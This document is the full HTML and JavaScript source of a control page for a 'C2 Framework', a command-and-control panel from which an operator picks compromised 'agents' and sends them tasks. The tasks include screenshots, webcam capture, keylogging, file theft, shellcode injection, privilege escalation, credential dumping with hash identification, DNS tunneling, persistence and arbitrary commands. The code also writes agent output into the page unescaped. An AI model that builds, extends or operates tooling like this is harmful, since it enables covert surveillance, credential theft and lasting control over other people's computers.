<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Control Panel - C2 Framework</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #2563eb;
            --secondary: #64748b;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --info: #06b6d4;
            --dark: #1e293b;
            --light: #f8fafc;
            --border: #e2e8f0;
            --background: #ffffff;
            --card-bg: #ffffff;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
        }

        [data-theme="dark"] {
            --background: #0f172a;
            --card-bg: #1e293b;
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --border: #334155;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--background);
            color: var(--text-primary);
            line-height: 1.6;
            transition: background-color 0.3s, color 0.3s;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Global Navigation */
        .global-nav {
            background: var(--card-bg);
            border-bottom: 1px solid var(--border);
            padding: 0;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .global-nav-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }

        .global-nav-brand {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
            text-decoration: none;
        }

        .global-nav-links {
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .global-nav-link {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 12px 16px;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .global-nav-link:hover {
            background: var(--light);
            color: var(--text-primary);
        }

        .global-nav-link.active {
            background: var(--primary);
            color: white;
        }

        .global-nav-link i {
            font-size: 1.1rem;
        }

        .theme-toggle {
            background: var(--card-bg);
            border: 1px solid var(--border);
            color: var(--text-primary);
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .theme-toggle:hover {
            background: var(--light);
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, var(--primary) 0%, #1d4ed8 100%);
            color: white;
            padding: 20px 0;
            margin-bottom: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 30px;
        }

        .header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin: 0;
        }

        /* Navigation */
        nav {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 8px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            display: flex;
            gap: 10px;
        }

        nav a {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 12px 24px;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        nav a:hover {
            background: var(--light);
            color: var(--text-primary);
        }

        nav a.active {
            background: var(--primary);
            color: white;
        }

        /* Agent Selection */
        .agent-select {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: var(--card-bg);
            color: var(--text-primary);
            margin-bottom: 30px;
            font-size: 1rem;
        }

        /* Module Grid */
        .module-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 24px;
            margin-bottom: 30px;
        }

        .module-card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            border: 1px solid var(--border);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .module-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px -5px rgba(0, 0, 0, 0.1);
        }

        .module-card h3 {
            color: var(--text-primary);
            margin-bottom: 10px;
            font-size: 1.25rem;
        }

        .module-card p {
            color: var(--text-secondary);
            margin-bottom: 20px;
        }

        .module-card button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
        }

        .module-card button:hover {
            background: #1d4ed8;
            transform: translateY(-1px);
        }

        /* Results */
        .result-header {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border: 1px solid var(--border);
        }

        .result-content {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border: 1px solid var(--border);
        }

        /* Results Section */
        .results-section {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border: 1px solid var(--border);
        }

        .results-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .results-header h3 {
            color: var(--text-primary);
            margin-bottom: 0;
        }

        .results-controls {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 8px 12px;
            border-radius: 6px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
            border: none;
        }

        .btn-primary:hover {
            background: #1d4ed8;
        }

        .btn-secondary {
            background: var(--secondary);
            color: white;
            border: none;
        }

        .btn-secondary:hover {
            background: #475569;
        }

        .results-container {
            min-height: 200px; /* Ensure a minimum height for the results container */
        }

        .no-results {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 50px 20px;
            color: var(--text-secondary);
            text-align: center;
        }

        .no-results i {
            font-size: 3rem;
            margin-bottom: 15px;
        }

        .no-results p {
            font-size: 1.1rem;
        }

        /* Enhanced Results Display */
        .results-block {
            background: var(--background);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }

        .results-block:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border);
        }

        .result-title {
            font-weight: 600;
            color: var(--text-primary);
            font-size: 1.1rem;
        }

        .result-meta {
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .status-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-badge.success { background: #dcfce7; color: #166534; }
        .status-badge.error { background: #fef2f2; color: #dc2626; }
        .status-badge.running { background: #fef3c7; color: #d97706; }
        .status-badge.pending { background: #f3f4f6; color: #6b7280; }

        .result-content {
            margin-bottom: 15px;
        }

        .result-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .download-btn, .view-btn {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 6px 12px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 0.85rem;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .download-btn {
            background: var(--success);
            color: white;
        }

        .download-btn:hover {
            background: #059669;
            transform: translateY(-1px);
        }

        .view-btn {
            background: var(--info);
            color: white;
        }

        .view-btn:hover {
            background: #0891b2;
            transform: translateY(-1px);
        }

        .image-preview {
            max-width: 200px;
            max-height: 150px;
            border-radius: 6px;
            cursor: pointer;
            transition: transform 0.3s ease;
        }

        .image-preview:hover {
            transform: scale(1.05);
        }

        .json-preview {
            background: var(--background);
            padding: 12px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            border: 1px solid var(--border);
        }

        .error-message {
            color: var(--danger);
            background: rgba(239, 68, 68, 0.1);
            padding: 10px;
            border-radius: 6px;
            margin: 10px 0;
            border-left: 4px solid var(--danger);
        }

        .cmd-result-block {
            background: var(--background);
            padding: 12px;
            border-radius: 6px;
            margin: 10px 0;
            border: 1px solid var(--border);
        }

        .cmd-result-block pre {
            background: var(--card-bg);
            padding: 8px;
            border-radius: 4px;
            margin: 5px 0;
            overflow-x: auto;
            font-size: 0.85rem;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
        }

        .modal-content {
            position: relative;
            max-width: 90%;
            max-height: 90%;
            margin: auto;
            top: 50%;
            transform: translateY(-50%);
        }

        .modal-image {
            max-width: 100%;
            max-height: 90vh;
            object-fit: contain;
            border-radius: 8px;
        }

        .close-modal {
            position: absolute;
            top: -40px;
            right: 0;
            color: white;
            font-size: 30px;
            cursor: pointer;
            background: none;
            border: none;
        }

        /* Task Status */
        #taskStatus {
            margin: 20px 0;
            padding: 12px 16px;
            border-radius: 6px;
            display: none;
            font-weight: 500;
        }

        #taskStatus.success {
            background: #dcfce7;
            color: #166534;
            border: 1px solid #bbf7d0;
        }

        #taskStatus.error {
            background: #fef2f2;
            color: #dc2626;
            border: 1px solid #fecaca;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .global-nav-content {
                flex-direction: column;
                gap: 15px;
                padding: 15px 20px;
            }

            .global-nav-links {
                flex-wrap: wrap;
                justify-content: center;
            }

            .module-grid {
                grid-template-columns: 1fr;
            }

            .header-content {
                flex-direction: column;
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Global Navigation -->
    <nav class="global-nav">
        <div class="global-nav-content">
            <a href="/" class="global-nav-brand">
                <i class="fas fa-shield-alt"></i>
                C2 Framework
            </a>
            <div class="global-nav-links">
                <a href="/" class="global-nav-link">
                    <i class="fas fa-chart-line"></i>
                    Dashboard
                </a>
                <a href="/control" class="global-nav-link active">
                    <i class="fas fa-cogs"></i>
                    Control Panel
                </a>
                <a href="/shellcode" class="global-nav-link">
                    <i class="fas fa-code"></i>
                    Shellcode
                </a>
                <button class="theme-toggle" onclick="toggleTheme()">
                    <i class="fas fa-moon"></i>
                </button>
            </div>
        </div>
    </nav>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="header-content">
                <h1><i class="fas fa-cogs"></i> Task Control Panel</h1>
            </div>
        </div>

        <select id="agentSelect" class="agent-select">
            <option value="">Select an agent...</option>
        </select>

        <!-- Results Section -->
        <div class="results-section">
            <div class="results-header">
                <h3><i class="fas fa-list-alt"></i> Agent Results</h3>
                <div class="results-controls">
                    <a href="/index" class="btn btn-secondary">
                        <i class="fas fa-desktop"></i> View Agent Dashboard
                    </a>
                    <button class="btn btn-primary" onclick="refreshResults()">
                        <i class="fas fa-refresh"></i> Refresh Results
                    </button>
                    <button class="btn btn-secondary" onclick="clearResults()">
                        <i class="fas fa-trash"></i> Clear Display
                    </button>
                </div>
            </div>
            <div id="results" class="results-container">
                <div class="no-results">
                    <i class="fas fa-info-circle"></i>
                    <p>Select an agent to view their results</p>
                </div>
            </div>
        </div>

        <div class="module-grid">
            <!-- Core Modules -->
            <div class="module-card">
                <h3>System Information</h3>
                <p>Get detailed system information from the target.</p>
                <button onclick="sendTask('system.get_info')">Get System Info</button>
            </div>

            <div class="module-card">
                <h3>Process Management</h3>
                <p>List and manage processes on the target system.</p>
                <button onclick="sendTask('process.list')">List Processes</button>
            </div>

            <!-- Surveillance Modules -->
            <div class="module-card">
                <h3>Screenshot</h3>
                <p>Capture screen of the target system.</p>
                <button onclick="sendTask('surveillance.screenshot')">Take Screenshot</button>
            </div>

            <div class="module-card">
                <h3>Webcam</h3>
                <p>Capture image from webcam if available.</p>
                <button onclick="sendTask('surveillance.webcam')">Capture Webcam</button>
            </div>

            <div class="module-card">
                <h3>Keylogger</h3>
                <p>Start/Stop keylogging on the target.</p>
                <button onclick="sendTask('surveillance.keylogger')">Toggle Keylogger</button>
            </div>

            <!-- File Operations -->
            <div class="module-card">
                <h3>File Browser</h3>
                <p>Browse and download files from the target.</p>
                <button onclick="sendTask('files.browser')">Browse Files</button>
            </div>

            <!-- Advanced Modules -->
            <div class="module-card">
                <h3>Shellcode Injection</h3>
                <p>Inject shellcode into target process.</p>
                <button onclick="window.location.href='/shellcode'">Inject Shellcode</button>
            </div>

            <div class="module-card">
                <h3>Privilege Escalation</h3>
                <p>Attempt to elevate privileges.</p>
                <button onclick="sendTask('privesc.auto')">Escalate Privileges</button>
            </div>

            <div class="module-card">
                <h3>Credential Access</h3>
                <p>Attempt to dump stored credentials.</p>
                <button onclick="sendTask('credentials.dump')">Dump Credentials</button>
            </div>

            <div class="module-card">
                <h3>DNS Tunneling</h3>
                <p>Establish DNS tunneling channel.</p>
                <button onclick="sendTask('dns_tunnel.start')">Toggle DNS Tunnel</button>
            </div>

            <div class="module-card">
                <h3>Persistence</h3>
                <p>Install persistence mechanism.</p>
                <button onclick="sendTask('persistence.install')">Install Persistence</button>
            </div>

            <div class="module-card">
                <h3>Custom Command</h3>
                <p>Execute custom command on target.</p>
                <button onclick="window.location.href='/shellcode'">Execute Command</button>
            </div>
        </div>

        <div id="taskStatus"></div>
    </div>

    <div id="imageModal" class="modal">
        <div class="modal-content">
            <span class="close-modal">&times;</span>
            <img id="modalImage" class="modal-image" src="" alt="Full size preview">
        </div>
    </div>

    <script>
        function toggleTheme() {
            const current = localStorage.getItem('theme') || 'light';
            const next = current === 'light' ? 'dark' : 'light';
            localStorage.setItem('theme', next);
            document.body.setAttribute('data-theme', next);
        }

        // Initialize theme
        document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');

        async function updateAgentList() {
            try {
                const response = await fetch('/api/agents');
                const data = await response.json();
                const select = document.getElementById('agentSelect');
                
                // Clear existing options except the first one
                while (select.options.length > 1) {
                    select.remove(1);
                }
                
                // Check if the response has the expected structure
                if (data.status === 'success' && data.agents) {
                    // Add new options
                    data.agents.forEach(agent => {
                        const option = document.createElement('option');
                        option.value = agent.agent_id;
                        const hostname = agent.system_info?.hostname || 'Unknown';
                        option.textContent = `${agent.agent_id} (${hostname}) - ${agent.status || 'Unknown'}`;
                        select.appendChild(option);
                    });
                } else {
                    console.warn('Unexpected API response format:', data);
                }
            } catch (error) {
                console.error('Error updating agent list:', error);
                showStatus('Failed to update agent list', 'error');
            }
        }

        async function sendTask(taskType) {
            const agentId = document.getElementById('agentSelect').value;
            if (!agentId) {
                showStatus('Please select an agent first', 'error');
                return;
            }

            try {
                const response = await fetch('/api/tasks', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        agent_id: agentId,
                        module: taskType,
                        params: {}
                    })
                });

                const result = await response.json();
                if (result.status === 'success') {
                    showStatus(`Task sent successfully. Task ID: ${result.task_id}`, 'success');
                    // Refresh the agent list to show updated status
                    setTimeout(updateAgentList, 1000);
                } else {
                    showStatus(`Error: ${result.message}`, 'error');
                }
            } catch (error) {
                showStatus(`Error sending task: ${error.message}`, 'error');
            }
        }

        async function sendCustomCommand() {
            const command = prompt('Enter command to execute:');
            if (command) {
                const agentId = document.getElementById('agentSelect').value;
                if (!agentId) {
                    showStatus('Please select an agent first', 'error');
                    return;
                }

                try {
                    const response = await fetch('/api/tasks', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            agent_id: agentId,
                            module: 'shell.execute',
                            params: {
                                command: command
                            }
                        })
                    });

                    const result = await response.json();
                    if (result.status === 'success') {
                        showStatus(`Command sent successfully. Task ID: ${result.task_id}`, 'success');
                        // Refresh the agent list to show updated status
                        setTimeout(updateAgentList, 1000);
                    } else {
                        showStatus(`Error: ${result.message}`, 'error');
                    }
                } catch (error) {
                    showStatus(`Error sending command: ${error.message}`, 'error');
                }
            }
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('taskStatus');
            statusDiv.textContent = message;
            statusDiv.className = type;
            statusDiv.style.display = 'block';
            
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }

        document.getElementById('agentSelect').addEventListener('change', function() {
            const agentId = this.value;
            if (agentId) {
                loadAgentResults(agentId);
            } else {
                document.getElementById('results').innerHTML = '';
            }
        });

        async function loadAgentResults(agentId) {
            const res = await fetch(`/api/results/${agentId}`);
            const data = await res.json();
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';
            
            if (data.status === 'success') {
                const results = data.results;
                if (results.length === 0) {
                    resultsDiv.innerHTML = '<div class="results-block"><b>No results yet.</b></div>';
                    return;
                }
                
                // Sort results by timestamp (newest first)
                results.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                results.forEach(result => {
                    const taskId = result.task_id;
                    const type = result.type || 'Unknown';
                    const time = new Date(result.timestamp).toLocaleString();
                    const status = result.status || '';
                    let preview = '';
                    let actions = '';
                    
                    try {
                        // Debug: Log the full result structure
                        if (type === 'surveillance_screenshot') {
                            console.log('=== SCREENSHOT RESULT DEBUG ===');
                            console.log('Full result object:', result);
                            console.log('result.result:', result.result);
                            console.log('result.data:', result.data);
                            if (result.result) {
                                console.log('result.result.image exists:', !!result.result.image);
                                console.log('result.result.format:', result.result.format);
                            }
                            if (result.data) {
                                console.log('result.data.image exists:', !!result.data.image);
                                console.log('result.data.format:', result.data.format);
                            }
                            console.log('=================================');
                        }
                        
                        // Handle image results - check all possible data structures
                        let imageData = null;
                        let imageFormat = null;
                        
                        // Check for result.result.image structure (screenshot format)
                        if (result.result && result.result.image && result.result.format) {
                            imageData = result.result.image;
                            imageFormat = result.result.format;
                        }
                        // Check for result.result.data structure  
                        else if (result.result && result.result.data && result.result.format) {
                            imageData = result.result.data;
                            imageFormat = result.result.format;
                        }
                        // Check for result.data.image structure
                        else if (result.data && result.data.image && result.data.format) {
                            imageData = result.data.image;
                            imageFormat = result.data.format;
                        }
                        // Check for top-level result.data/format
                        else if (result.data && result.format && typeof result.data === 'string') {
                            imageData = result.data;
                            imageFormat = result.format;
                        }
                        // Special handling for surveillance_screenshot type
                        else if (type === 'surveillance_screenshot' && result.result) {
                            const resultData = result.result;
                            if (resultData.image && resultData.format) {
                                imageData = resultData.image;
                                imageFormat = resultData.format;
                            }
                        }
                        
                        if (imageData && imageFormat && ['png','jpg','jpeg','gif','bmp'].includes(imageFormat.toLowerCase())) {
                            // Truncate very long base64 strings for preview (keep first 100 chars for validation)
                            const shortImageData = imageData.length > 1000 ? imageData.substring(0, 100) + '...[truncated]' : imageData;
                            
                            preview = `
                                <div style="margin-bottom: 10px;">
                                    <img src="data:image/${imageFormat.toLowerCase()};base64,${imageData}" 
                                         class="image-preview" 
                                         onclick="showFullImage(this.src)"
                                         alt="Screenshot"
                                         style="max-width: 300px; max-height: 200px; border-radius: 4px; cursor: pointer;"
                                         onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                                    <div style="display:none; padding: 10px; background: #f0f0f0; border-radius: 4px;">
                                        <p>ðŸ“· Screenshot captured (${imageFormat.toUpperCase()})</p>
                                        <p>Image data: ${shortImageData}</p>
                                        <p><em>Click download to view full image</em></p>
                                    </div>
                                </div>
                            `;
                            actions = `
                                <a href="/api/results/download/${taskId}" class="download-btn" download>
                                    <i class="fas fa-download"></i> Download Screenshot
                                </a>
                            `;
                        }
                        // Fallback: if no image was detected but this is a screenshot, force image display
                        else if (type === 'surveillance_screenshot' && !imageData) {
                            console.log('FALLBACK: Trying to extract image from screenshot result');
                            
                            // Try to find image data anywhere in the result
                            const searchForImage = (obj, path = '') => {
                                if (typeof obj === 'object' && obj !== null) {
                                    for (const [key, value] of Object.entries(obj)) {
                                        const currentPath = path ? `${path}.${key}` : key;
                                        
                                        if (key === 'image' && typeof value === 'string' && value.length > 100) {
                                            console.log(`Found image data at: ${currentPath}`);
                                            return { image: value, path: currentPath };
                                        }
                                        
                                        if (typeof value === 'object') {
                                            const found = searchForImage(value, currentPath);
                                            if (found) return found;
                                        }
                                    }
                                }
                                return null;
                            };
                            
                            const foundImage = searchForImage(result);
                            if (foundImage) {
                                imageData = foundImage.image;
                                imageFormat = 'png'; // Default to PNG
                                console.log(`Using image from: ${foundImage.path}`);
                                
                                preview = `
                                    <div style="margin-bottom: 10px;">
                                        <p><strong>ðŸ“· Screenshot (Found at: ${foundImage.path})</strong></p>
                                        <img src="data:image/png;base64,${imageData}" 
                                             class="image-preview" 
                                             onclick="showFullImage(this.src)"
                                             alt="Screenshot"
                                             style="max-width: 300px; max-height: 200px; border-radius: 4px; cursor: pointer;"
                                             onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                                        <div style="display:none; padding: 10px; background: #f0f0f0; border-radius: 4px;">
                                            <p>ðŸ“· Screenshot captured but image failed to display</p>
                                            <p><em>Click download to view full image</em></p>
                                        </div>
                                    </div>
                                `;
                                actions = `
                                    <a href="/api/results/download/${taskId}" class="download-btn" download>
                                        <i class="fas fa-download"></i> Download Screenshot
                                    </a>
                                `;
                            }
                        }
                        // Handle file results
                        else if (result.data && result.path) {
                            preview = `<pre>File: ${result.path}</pre>`;
                            actions = `
                                <a href="/api/results/download/${taskId}" class="download-btn" download>
                                    <i class="fas fa-download"></i> Download File
                                </a>
                            `;
                        }
                        // Handle JSON/text results
                        else {
                            const content = result.result || result.data;
                            if (typeof content === 'object') {
                                // If this is a credential dump result, try to identify and annotate hashes
                                let jsonStr = JSON.stringify(content, null, 2);
                                // Regex to find likely hashes (32, 40, 64, 128 hex chars, or $x$...)
                                jsonStr = jsonStr.replace(/([a-fA-F0-9]{32,128}|\$[126yab]\$[^\s"]+)/g, function(match) {
                                    const type = identifyHashType(match);
                                    return match + (type !== 'Unknown' ? `  <span style='color:var(--primary);font-size:0.95em;'>[${type}]</span>` : '');
                                });
                                const isLong = jsonStr.length > 600;
                                preview = `
                                    <pre class="json-preview" style="max-height: 200px; overflow-y: auto;">${isLong ? jsonStr.slice(0, 600) + '...' : jsonStr}</pre>
                                    ${isLong ? `<a href="#" class="expand-json" onclick="showFullJson(this, \`${jsonStr.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`); return false;">Show full</a>` : ''}
                                `;
                            } else {
                                preview = `<pre>${String(content)}</pre>`;
                            }
                            actions = `
                                <a href="/api/results/download/${taskId}" class="download-btn" download>
                                    <i class="fas fa-download"></i> Download Result
                                </a>
                            `;
                        }
                        
                        // Add error message if present
                        if (result.error) {
                            preview += `<div class="error-message">Error: ${result.error}</div>`;
                        }
                        
                        // Add command result block if present
                        if (result.data && typeof result.data === 'object' && (
                            result.data.output !== undefined || result.data.error !== undefined || result.data.returncode !== undefined)) {
                            preview += `<div class="cmd-result-block">
                                <b>Command Output:</b><pre>${result.data.output ? result.data.output : '(none)'}</pre>
                                <b>Command Error:</b><pre>${result.data.error ? result.data.error : '(none)'}</pre>
                                <b>Return Code:</b> ${result.data.returncode !== undefined ? result.data.returncode : '(none)'}
                            </div>`;
                        }
                        
                        resultsDiv.innerHTML += `
                            <div class="results-block">
                                <div class="result-header">
                                    <div class="result-title">${type}</div>
                                    <div class="result-meta">
                                        <span>${time}</span>
                                        <span class="status-badge ${status.toLowerCase()}">${status}</span>
                                    </div>
                                </div>
                                <div class="result-content">
                                    ${preview}
                                    <div class="result-actions">
                                        ${actions}
                                    </div>
                                </div>
                            </div>
                        `;
                    } catch (error) {
                        console.error('Error processing result:', error);
                        resultsDiv.innerHTML += `
                            <div class="results-block">
                                <div class="error-message">
                                    Error processing result: ${error.message}
                                </div>
                            </div>
                        `;
                    }
                });
            }
        }

        // Add these new functions for image preview
        function showFullImage(src) {
            const modal = document.getElementById('imageModal');
            const modalImg = document.getElementById('modalImage');
            modal.style.display = "block";
            modalImg.src = src;
        }

        // Close modal when clicking the X or outside the image
        document.querySelector('.close-modal').onclick = function() {
            document.getElementById('imageModal').style.display = "none";
        }

        document.getElementById('imageModal').onclick = function(e) {
            if (e.target === this) {
                this.style.display = "none";
            }
        }

        // Add Font Awesome for icons
        const fontAwesome = document.createElement('link');
        fontAwesome.rel = 'stylesheet';
        fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css';
        document.head.appendChild(fontAwesome);

        // Update agent list every 10 seconds
        updateAgentList();
        setInterval(updateAgentList, 10000);
        
        // Force reload check - if the page was cached, reload once
        if (!sessionStorage.getItem('reloaded_v2')) {
            sessionStorage.setItem('reloaded_v2', 'true');
            console.log('Forcing reload to clear cache...');
            location.reload();
        }

        function showFullJson(link, fullJson) {
            const pre = link.previousElementSibling;
            pre.textContent = fullJson;
            pre.style.maxHeight = '400px';
            link.remove();
        }

        // Add this hash identifier function to the <script> section
        function identifyHashType(hash) {
            hash = hash.trim();
            if (/^[a-fA-F0-9]{32}$/.test(hash)) return 'MD5 or NTLM';
            if (/^[a-fA-F0-9]{40}$/.test(hash)) return 'SHA-1';
            if (/^[a-fA-F0-9]{64}$/.test(hash)) return 'SHA-256';
            if (/^[a-fA-F0-9]{128}$/.test(hash)) return 'SHA-512';
            if (/^[a-fA-F0-9]{16}$/.test(hash)) return 'LM';
            if (hash.startsWith('$6$')) return 'SHA-512 (Unix)';
            if (hash.startsWith('$1$')) return 'MD5 (Unix)';
            if (hash.startsWith('$2y$') || hash.startsWith('$2a$')) return 'bcrypt';
            if (hash.startsWith('$5$')) return 'SHA-256 (Unix)';
            return 'Unknown';
        }

        async function refreshResults() {
            const agentId = document.getElementById('agentSelect').value;
            if (agentId) {
                await loadAgentResults(agentId);
            } else {
                showStatus('Please select an agent first', 'error');
            }
        }

        async function clearResults() {
            const agentId = document.getElementById('agentSelect').value;
            if (agentId) {
                try {
                    const response = await fetch(`/api/results/${agentId}/clear`, {
                        method: 'POST'
                    });
                    const result = await response.json();
                    if (result.status === 'success') {
                        showStatus('Results cleared successfully.', 'success');
                        await loadAgentResults(agentId); // Reload results to show empty state
                    } else {
                        showStatus(`Error clearing results: ${result.message}`, 'error');
                    }
                } catch (error) {
                    showStatus(`Error clearing results: ${error.message}`, 'error');
                }
            } else {
                showStatus('Please select an agent first', 'error');
            }
        }
    </script>
</body>
</html>
